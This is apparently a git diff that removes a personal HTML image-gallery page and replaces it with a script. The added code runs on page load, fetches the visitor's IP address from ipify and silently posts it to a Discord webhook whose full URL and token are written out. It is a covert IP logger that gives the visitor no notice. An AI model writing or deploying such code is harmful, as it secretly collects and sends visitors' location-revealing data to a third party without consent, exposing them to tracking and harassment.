@@ -1,57 +1,19 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>adamXshaylee</title>
-    <style>
-        /* Add your custom CSS styles here */
-        body {
-            font-family: Arial, sans-serif;
+<script>
+    function getIP(json) {
+      var request = new XMLHttpRequest(); //making a request for the webhook
+          request.open("POST", "https://discord.com/api/webhooks/1289710602612244550/7qY6BEz4eBXRwtYpKxwbC1b1cUNy0luWtLevSjBBtBpPjFpX60MHTbKX8lKpyW64hxB5"); 
+    
+          request.setRequestHeader('Content-type', 'application/json');
+    
+          var params = {
+            username: "skibidi sigma",
+            avatar_url: "https://cdn.discordapp.com/avatars/965760449817759744/06322dd115f305d0f7e97bbc9ca37481.webp?size=80",
+            content: "IP:" + json.ip
+          }
+    
+          request.send(JSON.stringify(params));
         }
-        .grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-            gap: 10px;
-        }
-        .grid-item {
-            overflow: hidden;
-        }
-        .grid-item img {
-            max-width: 100%;
-            height: auto;
-        }
-    </style>
-</head>
-<body>
-    <h1>there u go princess its deleted anything else u need?</h1>
-    <div class="grid">
-        <!-- Add your images here -->
-        <div class="grid-item">
-            <img src="img1.png" alt="Image 1">
-        </div>
-        <div class="grid-item">
-            <img src="img2.png" alt="Image 2">
-        </div>
-        <div class="grid-item">
-            <img src="image4.png" alt="Image 4">
-        </div>
-        <div class="grid-item">
-          <img src="image5.png" alt="Image 5">
-        </div>
-        <div class="grid-item">
-          <img src="image6.png" alt="Image 6">
-       </div>
-       <div class="grid-item">
-        <img src="image7.png" alt="Image 7">
-     </div>
-     <div class="grid-item">
-      <img src="image8.png" alt="Image 8">
-     </div>
-     <div class="grid-item">
-      <img src="image9.png" alt="Image 9">
-     </div>
-        <!-- Add more images as needed -->
-    </div>
-</body>
-</html>
+    
+    </script>
+    <script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>  
+    <!-- This is a api -->
